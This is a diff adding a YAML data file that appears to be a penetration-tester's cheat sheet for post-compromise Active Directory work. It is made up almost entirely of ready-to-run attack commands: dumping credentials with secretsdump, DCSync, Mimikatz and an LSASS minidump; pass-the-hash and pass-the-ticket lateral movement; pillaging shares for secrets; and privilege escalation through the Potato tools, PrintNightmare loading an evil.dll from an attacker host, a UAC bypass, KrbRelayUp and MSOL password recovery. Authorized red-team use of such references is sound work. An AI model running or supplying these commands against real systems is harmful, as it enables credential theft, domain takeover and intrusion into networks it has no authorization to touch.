@@ -1,0 +1,136 @@
+tab: admin
+title: Admin access
+order: 30
+blurb: >
+  You have local admin on a host (or DA). Dump credentials, move laterally, and
+  reuse hashes/tickets. Pass creds, -H $NTHASH, or a ccache.
+
+sections:
+
+  - name: Credential dumping — remote
+    hint: With admin, pull secrets over the wire.
+    steps:
+      - text: secretsdump (SAM + LSA + cached)
+        cmds:
+          - "impacket-secretsdump $DOMAIN/$USER:$PASS@$RHOST"
+          - {c: "impacket-secretsdump -hashes :$NTHASH $DOMAIN/$USER@$RHOST", lbl: "pass-the-hash"}
+          - "nxc smb $RHOST -u $USER -p $PASS --sam --lsa"
+      - text: DCSync (needs replication rights / DA)
+        flags: [admin]
+        cmds:
+          - "impacket-secretsdump -just-dc $DOMAIN/$USER:$PASS@$RHOST"
+          - {c: "impacket-secretsdump -just-dc-user krbtgt $DOMAIN/$USER:$PASS@$RHOST", lbl: "krbtgt for golden ticket"}
+          - "nxc smb $RHOST -u $USER -p $PASS -M ntdsutil"
+
+  - name: Credential dumping — on host
+    hint: Running on the compromised Windows machine.
+    steps:
+      - text: Mimikatz — LSASS
+        flags: [win]
+        cmds:
+          - {c: "privilege::debug", lbl: "then sekurlsa::logonpasswords"}
+          - "sekurlsa::logonpasswords"
+          - {c: "lsadump::sam", lbl: "local SAM"}
+          - {c: "lsadump::dcsync /user:krbtgt", lbl: "DCSync from host"}
+      - text: LSASS dump then parse offline
+        flags: [win]
+        cmds:
+          - {c: "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump <lsass_pid> C:\\Temp\\lsass.dmp full", lbl: "living-off-the-land"}
+          - "pypykatz lsa minidump lsass.dmp"
+      - text: Remote LSASS via netexec (lsassy)
+        cmds:
+          - "nxc smb $TARGET -u $USER -p $PASS -M lsassy"
+          - {c: "nxc smb <cidr> -u $USER -H $NTHASH -M lsassy", lbl: "sweep with a hash"}
+
+  - name: Lateral movement / exec
+    hint: Reuse $PASS, -hashes LM:NT, or a Kerberos ticket.
+    steps:
+      - text: WinRM
+        cmds:
+          - "evil-winrm -i $RHOST -u $USER -p '$PASS'"
+          - {c: "evil-winrm -i $RHOST -u $USER -H $NTHASH", lbl: "pass-the-hash"}
+      - text: Impacket exec
+        cmds:
+          - "impacket-psexec $DOMAIN/$USER:$PASS@$RHOST"
+          - "impacket-wmiexec $DOMAIN/$USER@$RHOST -hashes :$NTHASH"
+          - {c: "impacket-smbexec $DOMAIN/$USER:$PASS@$RHOST", lbl: "quieter, no upload"}
+      - text: netexec command exec / spraying access
+        cmds:
+          - "nxc smb $RHOST -u $USER -H $NTHASH -x whoami"
+          - "nxc smb <cidr> -u $USER -H $NTHASH --continue-on-success"
+
+  - name: Pass-the-hash / key / ticket
+    hint: Authenticate with material instead of a password.
+    steps:
+      - text: Pass-the-Hash (NTLM)
+        cmds:
+          - "impacket-psexec -hashes :$NTHASH $DOMAIN/$USER@$RHOST"
+          - "nxc smb $RHOST -u $USER -H $NTHASH"
+      - text: Overpass-the-Hash → TGT
+        cmds:
+          - "impacket-getTGT $DOMAIN/$USER -hashes :$NTHASH -dc-ip $RHOST"
+          - {c: ".\\Rubeus.exe asktgt /user:$USER /rc4:$NTHASH /ptt", lbl: "Rubeus (on host)"}
+      - text: Pass-the-Ticket
+        cmds:
+          - "export KRB5CCNAME=ticket.ccache"
+          - "impacket-psexec -k -no-pass $DOMAIN/$USER@$RHOST"
+          - {c: ".\\Rubeus.exe ptt /ticket:ticket.kirbi", lbl: "inject .kirbi on host"}
+
+  - name: File / share pillaging
+    hint: Hunt shares for creds, configs, keys once you can read broadly.
+    steps:
+      - text: Map & spider shares
+        cmds:
+          - "smbmap -H $RHOST -u $USER -p '$PASS' -R --depth 5"
+          - "nxc smb $RHOST -u $USER -p $PASS -M spider_plus"
+          - {c: "nxc smb $TARGET -u $USER -p $PASS --spider C$ --pattern xml,txt,config,ini,ps1,bat", lbl: "grep-style pattern hunt"}
+      - text: DonPAPI — mass DPAPI / browser / cred loot
+        cmds:
+          - "DonPAPI.py $DOMAIN/$USER:$PASS@$TARGET"
+      - text: Snaffler — automated cred hunting (on host)
+        flags: [win]
+        cmds:
+          - "Snaffler.exe -s -o snaffler.log"
+          - {c: "Snaffler.exe -s -i C:\\ -o snaffler.log", lbl: "whole local disk"}
+      - text: Grab a specific file
+        cmds:
+          - "smbclient //$RHOST/<share> -U '$DOMAIN\\$USER%$PASS' -c 'get <file>'"
+
+  - name: Local privilege escalation (host → SYSTEM)
+    hint: You have a shell as a service/low-priv account on a Windows host. Get SYSTEM.
+    steps:
+      - text: SeImpersonate → Potato family
+        flags: [win]
+        cmds:
+          - {c: "PrintSpoofer.exe -i -c cmd", lbl: "SeImpersonate, has spooler"}
+          - {c: "GodPotato.exe -cmd \"cmd /c whoami\"", lbl: "modern, DCOM"}
+          - {c: "RoguePotato.exe -r $LHOST -e \"cmd.exe\" -l 9999", lbl: "needs OXID resolver relay"}
+          - {c: "RemotePotato0.exe -m 2 -r $LHOST -x $LHOST -p 9999", lbl: "cross-session relay"}
+      - text: PrintNightmare (CVE-2021-1675 / 34527)
+        flags: [cve]
+        cmds:
+          - {c: "# RCE via malicious driver DLL over a share (cube0x0 PoC)", plain: true}
+          - "CVE-2021-1675.py $DOMAIN/$USER:$PASS@$TARGET '\\\\$LHOST\\share\\evil.dll'"
+          - {c: "Invoke-Nightmare -NewUser hacker -NewPassword 'P@ss!'", lbl: "local admin add (calebstewart PoC)"}
+      - text: UAC bypass (medium → high integrity)
+        flags: [win]
+        cmds:
+          - {c: "# fodhelper.exe registry hijack (auto-elevates, no consent)", plain: true}
+          - "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe\" /f && reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /f && fodhelper.exe"
+
+  - name: KrbRelayUp (local → DA on a domain-joined host)
+    hint: Universal no-fix local privesc when LDAP signing isn't enforced.
+    steps:
+      - text: Relay + RBCD + spawn SYSTEM
+        flags: [win, cve]
+        cmds:
+          - ".\\KrbRelayUp.exe relay -Domain $DOMAIN -CreateNewComputerAccount -ComputerName 'ATTACK$' -ComputerPassword 'Passw0rd!'"
+          - ".\\KrbRelayUp.exe spawn -m rbcd -d $DOMAIN -dc $RHOST -cn 'ATTACK$' -cp 'Passw0rd!'"
+
+  - name: Azure AD Connect / MSOL
+    hint: The MSOL_ sync account can DCSync; its password is recoverable from the Connect server.
+    steps:
+      - text: Find & dump MSOL
+        cmds:
+          - "nxc ldap $RHOST -u $USER -p $PASS -M get-desc-users | grep -i MSOL"
+          - {c: "nxc smb $TARGET -u $USER -p $PASS -M msol", lbl: "dump cleartext on the Connect server"}
